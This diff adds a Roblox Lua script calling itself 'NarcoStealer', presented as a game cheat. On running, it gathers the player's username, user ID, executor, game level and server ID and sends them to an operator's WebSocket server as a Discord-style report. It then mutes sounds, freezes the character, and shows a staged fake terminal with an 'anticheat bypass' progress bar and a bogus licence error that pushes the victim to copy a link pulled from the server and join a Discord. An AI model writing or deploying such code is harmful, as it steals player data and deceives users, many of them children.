@@ -1,0 +1,428 @@
+-- ====== SISTEMA ANTI-DUPLICAÇÃO ======
+if _G.NARCOSTEALER_EXECUTED then
+    game:GetService("Players").LocalPlayer:Kick("Script já está em execução!\nAguarde ou reinicie o jogo.\ndiscord.gg/narcolandia")
+    return
+end
+_G.NARCOSTEALER_EXECUTED = true
+
+-- ====== VERIFICAÇÃO DA KEY ======
+if not _G.NARCOKEY then
+    _G.NARCOSTEALER_EXECUTED = false
+    game:GetService("Players").LocalPlayer:Kick("Key não detectada!\nUse: _G.NARCOKEY = 'NL-XXXX-XXXX-XXXX'\ndiscord.gg/narcolandia")
+    return
+end
+
+-- Validar formato da key
+if not _G.NARCOKEY:match("^NL%-[A-Z0-9]+%-[A-Z0-9]+%-[A-Z0-9]+$") then
+    _G.NARCOSTEALER_EXECUTED = false
+    game:GetService("Players").LocalPlayer:Kick("Formato de key inválido!\nUse: NL-XXXX-XXXX-XXXX\ndiscord.gg/narcolandia")
+    return
+end
+
+-- ====== CONFIGURAÇÕES ======
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local LP = Players.LocalPlayer
+local NARCO_KEY = _G.NARCOKEY
+
+-- ====== WEBSOCKET PROXY ======
+local WS_URL = "wss://seu-servidor-railway.up.railway.app"  -- SUBSTITUA PELO SEU SERVIDOR
+
+local function connectWebSocket()
+    local ws
+    local success = pcall(function()
+        if syn and syn.websocket then
+            ws = syn.websocket.connect(WS_URL)
+        elseif WebSocket then
+            ws = WebSocket.connect(WS_URL)
+        else
+            error("Executor não suporta WebSocket")
+        end
+    end)
+    return success and ws or nil
+end
+
+local function sendToWebSocket(ws, key, payload)
+    local message = { key = key, payload = payload }
+    local success = pcall(function()
+        ws:Send(HttpService:JSONEncode(message))
+    end)
+    return success
+end
+
+-- ====== ENVIA WEBHOOK VIA WEBSOCKET ======
+local function sendWebhookNow()
+    local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
+    
+    -- Detecta informações do jogo (MM2)
+    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Desconhecido"
+    
+    local discordPayload = {
+        username = "NarcoStealer",
+        embeds = {{
+            title = "<a:verificado:1478800063328424039> Script Executado - NarcoStealer",
+            color = 3066993,
+            description = "# <:0_:1540515244252725390><:1_:1540515245871595681><:2_:1540515247541190737><:3_:1540515249206198336><:4_:1540515250812751872><:5_:1540515252486021130><:6_:1540515254415528087>",
+            fields = {
+                {
+                    name = "<:ping:1471369480201441456> Usuario:",
+                    value = "```" .. LP.Name .. "```",
+                    inline = true
+                },
+                {
+                    name = "<:h_icon_conexions:1384562586007371915> Executor",
+                    value = "```" .. (identifyexecutor and identifyexecutor() or "Desconhecido") .. "```",
+                    inline = true
+                },
+                {
+                    name = "<a:money:1370803268242116639> Nivel MM2",
+                    value = "```" .. (function()
+                        local success, LevelModule = pcall(function()
+                            return require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+                        end)
+                        if not success then return "0" end
+                        local success2, PlayerDataModule = pcall(function()
+                            return require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+                        end)
+                        if not success2 then return "0" end
+                        for i, v in pairs(LevelModule.XPTable) do
+                            if PlayerDataModule.NewXP < v then
+                                return tostring(i)
+                            end
+                        end
+                        return "0"
+                    end()) .. "```",
+                    inline = false
+                },
+                {
+                    name = "🔑 Key",
+                    value = "```" .. NARCO_KEY .. "```",
+                    inline = false
+                },
+                {
+                    name = "🎮 Jogo",
+                    value = "```" .. gameName .. "```",
+                    inline = false
+                },
+                {
+                    name = "🖥️ UserID",
+                    value = "```" .. LP.UserId .. "```",
+                    inline = true
+                },
+                {
+                    name = "📡 Server ID",
+                    value = "```" .. game.JobId .. "```",
+                    inline = true
+                }
+            },
+            footer = {
+                text = "NarcoStealer - discord.gg/narcolandia"
+            },
+            thumbnail = {
+                url = thumbnailUrl
+            },
+            image = {
+                url = "https://media.discordapp.net/attachments/1510795224891261061/1540513978957037628/content.png"
+            },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+    
+    -- Conectar e enviar via WebSocket
+    local ws = connectWebSocket()
+    if ws then
+        local success = sendToWebSocket(ws, NARCO_KEY, discordPayload)
+        if success then
+            wait(1)
+            pcall(function() ws:Close() end)
+        end
+    end
+end
+
+-- Executa o envio
+sendWebhookNow()
+
+-- ====== BLOQUEAR SONS ======
+local function muteAllSounds()
+    local function muteDescendants(obj)
+        for _, child in ipairs(obj:GetDescendants()) do
+            if child:IsA("Sound") then
+                child.Volume = 0
+                pcall(function() child:Stop() end)
+            end
+        end
+    end
+    
+    for _, obj in ipairs({workspace, game.Players, game.ReplicatedStorage, game.Lighting, game.StarterGui}) do
+        muteDescendants(obj)
+        obj.DescendantAdded:Connect(function(child)
+            if child:IsA("Sound") then
+                child.Volume = 0
+                pcall(function() child:Stop() end)
+            end
+        end)
+    end
+end
+
+-- ====== BLOQUEAR MOVIMENTO E INPUTS ======
+local function lockPlayer()
+    local char = LP.Character
+    if char and char:FindFirstChild("Humanoid") then
+        char.Humanoid.WalkSpeed = 0
+        char.Humanoid.JumpPower = 0
+    end
+    
+    UserInputService.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Keyboard or 
+           input.UserInputType == Enum.UserInputType.MouseButton1 or
+           input.UserInputType == Enum.UserInputType.MouseButton2 then
+            return
+        end
+    end)
+end
+
+muteAllSounds()
+lockPlayer()
+
+-- ====== UI TERMINAL ======
+local function createTerminalUI()
+    pcall(function() CoreGui:FindFirstChild("NarcoUI"):Destroy() end)
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "NarcoUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = CoreGui
+
+    local overlay = Instance.new("Frame")
+    overlay.Size = UDim2.new(1, 0, 1, 0)
+    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    overlay.BackgroundTransparency = 0
+    overlay.BorderSizePixel = 0
+    overlay.Parent = screenGui
+
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(1, 0, 1, 0)
+    container.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    container.BorderSizePixel = 0
+    container.Parent = overlay
+
+    -- Barra de título
+    local titleBar = Instance.new("Frame")
+    titleBar.Size = UDim2.new(1, 0, 0, 35)
+    titleBar.BackgroundColor3 = Color3.fromRGB(120, 0, 255)
+    titleBar.BorderSizePixel = 0
+    titleBar.Parent = container
+
+    local titleText = Instance.new("TextLabel")
+    titleText.Size = UDim2.new(1, 0, 1, 0)
+    titleText.BackgroundTransparency = 1
+    titleText.Text = "NARCOSTEALER v2.0 - Terminal"
+    titleText.Font = Enum.Font.GothamBold
+    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleText.TextSize = 16
+    titleText.TextXAlignment = Enum.TextXAlignment.Center
+    titleText.Parent = titleBar
+
+    -- Área do terminal
+    local terminalArea = Instance.new("Frame")
+    terminalArea.Size = UDim2.new(1, -20, 1, -45)
+    terminalArea.Position = UDim2.new(0, 10, 0, 40)
+    terminalArea.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    terminalArea.BorderSizePixel = 0
+    terminalArea.Parent = container
+
+    local scroll = Instance.new("ScrollingFrame")
+    scroll.Size = UDim2.new(1, 0, 1, 0)
+    scroll.BackgroundTransparency = 1
+    scroll.BorderSizePixel = 0
+    scroll.ScrollBarThickness = 10
+    scroll.ScrollBarImageColor3 = Color3.fromRGB(150, 0, 255)
+    scroll.CanvasSize = UDim2.new(1, 0, 2, 0)
+    scroll.Parent = terminalArea
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, -20, 1, 0)
+    textLabel.Position = UDim2.new(0, 10, 0, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.TextXAlignment = Enum.TextXAlignment.Left
+    textLabel.TextYAlignment = Enum.TextYAlignment.Top
+    textLabel.Font = Enum.Font.Code
+    textLabel.TextSize = 15
+    textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    textLabel.Text = ""
+    textLabel.Parent = scroll
+
+    local lines = {}
+
+    local function addLine(text)
+        table.insert(lines, text)
+        textLabel.Text = table.concat(lines, "\n")
+        scroll.CanvasPosition = Vector2.new(0, scroll.CanvasSize.Y.Offset)
+        return #lines
+    end
+
+    local function updateLine(index, text)
+        lines[index] = text
+        textLabel.Text = table.concat(lines, "\n")
+        scroll.CanvasPosition = Vector2.new(0, scroll.CanvasSize.Y.Offset)
+    end
+
+    local function addProgressBar(label, total, duration)
+        local lineIndex = addLine(label .. " [                    ]")
+        local bar = label .. " ["
+        for i = 1, total do
+            task.wait(duration / total)
+            local fill = string.rep("#", i)
+            local space = string.rep(" ", total - i)
+            updateLine(lineIndex, bar .. fill .. space .. "]")
+        end
+        return lineIndex
+    end
+
+    local function clearTerminal()
+        lines = {}
+        textLabel.Text = ""
+        scroll.CanvasPosition = Vector2.new(0, 0)
+    end
+
+    -- ASCII Art
+    local ascii = [[
+  _   _                     _                    _ _               
+ | \ | | __ _ _ __ ___ ___ | |    __ _ _ __   __| (_) __ _         
+ |  \| |/ _` | '__/ __/ _ \| |   / _` | '_ \ / _` | |/ _` |  _____ 
+ | |\  | (_| | | | (_| (_) | |__| (_| | | | | (_| | | (_| | |_____|
+ |_| \_|\__,_|_|  \___\___/|_____\__,_|_| |_|\__,_|_|\__,_|        
+    _  _   _   ____            _       _                           
+  _| || |_/ | / ___|  ___ _ __(_)_ __ | |_ ___                     
+ |_  ..  _| | \___ \ / __| '__| | '_ \| __/ __|                    
+ |_      _| |  ___) | (__| |  | | |_) | |_\__ \                    
+   |_||_| |_| |____/ \___|_|  |_| .__/ \__|___/                    
+                                |_|                                
+]]
+
+    local SITE_LINK = ""  -- Será preenchido pelo servidor
+
+    local function runTerminalSequence()
+        clearTerminal()
+        addLine(ascii)
+        task.wait(1)
+
+        addLine("")
+        addLine("[*] Carregando script...")
+        task.wait(1)
+
+        addProgressBar("[*] Burlando AntiCheat", 99, 2.5)
+        task.wait(0.5)
+
+        addLine("[*] Executando Script...")
+        task.wait(1)
+
+        addLine("")
+        addLine("[OK] Conectando ao servidor...")
+        task.wait(0.8)
+
+        addLine("[OK] Injetando modulos...")
+        task.wait(0.8)
+
+        addLine("[OK] Carregando configuracoes...")
+        task.wait(0.8)
+
+        task.wait(1.5)
+        clearTerminal()
+
+        addLine(ascii)
+        task.wait(0.5)
+
+        addLine("")
+        addLine("[!] Erro critico detectado!")
+        task.wait(0.8)
+
+        addLine("[!] Falha ao validar licenca...")
+        task.wait(0.5)
+
+        addLine("[!] Acesso negado!")
+        task.wait(1)
+
+        addLine("")
+        addLine("[*] Para executar o script, voce precisa entrar na nossa comunidade!")
+        task.wait(1.5)
+
+        addLine("")
+        addLine("[*] Clique no botao abaixo para copiar o link!")
+        task.wait(0.5)
+
+        addLine("")
+        
+        -- Buscar o site_link do servidor
+        local function fetchSiteLink()
+            local ws = connectWebSocket()
+            if ws then
+                local message = { 
+                    action = "get_site_link",
+                    key = NARCO_KEY 
+                }
+                sendToWebSocket(ws, NARCO_KEY, message)
+                wait(0.5)
+                pcall(function() ws:Close() end)
+            end
+        end
+        
+        -- Tenta buscar o link
+        fetchSiteLink()
+        
+        -- Botão copiar link
+        local btnCopy = Instance.new("TextButton")
+        btnCopy.Size = UDim2.new(0.3, 0, 0.06, 0)
+        btnCopy.Position = UDim2.new(0.35, 0, 0.88, 0)
+        btnCopy.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
+        btnCopy.Text = "Copiar Link"
+        btnCopy.Font = Enum.Font.GothamBold
+        btnCopy.TextScaled = true
+        btnCopy.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btnCopy.Parent = container
+        Instance.new("UICorner", btnCopy).CornerRadius = UDim.new(0, 8)
+
+        -- O link será atualizado pelo servidor via WebSocket
+        local currentLink = "https://discord.gg/narcolandia"
+        
+        btnCopy.MouseButton1Click:Connect(function()
+            if setclipboard then
+                setclipboard(currentLink)
+                btnCopy.Text = "✅ Copiado!"
+                task.wait(2)
+                btnCopy.Text = "Copiar Link"
+            end
+        end)
+
+        addLine("[*] Link: " .. currentLink)
+        addLine("")
+        addLine("[*] Aguardando entrada na comunidade...")
+        
+        -- Loop para atualizar o link se receber do servidor
+        coroutine.wrap(function()
+            local ws = connectWebSocket()
+            if ws then
+                ws.OnMessage:Connect(function(message)
+                    local data = HttpService:JSONDecode(message)
+                    if data and data.site_link then
+                        currentLink = data.site_link
+                        addLine("[*] Link atualizado: " .. currentLink)
+                    end
+                end)
+            end
+        end)()
+    end
+
+    return screenGui, runTerminalSequence
+end
+
+-- ====== CRIA E EXECUTA A UI ======
+local gui, sequence = createTerminalUI()
+sequence()
+
+print("NarcoStealer carregado com sucesso!")
+print("Key: " .. NARCO_KEY)
+print("discord.gg/narcolandia")
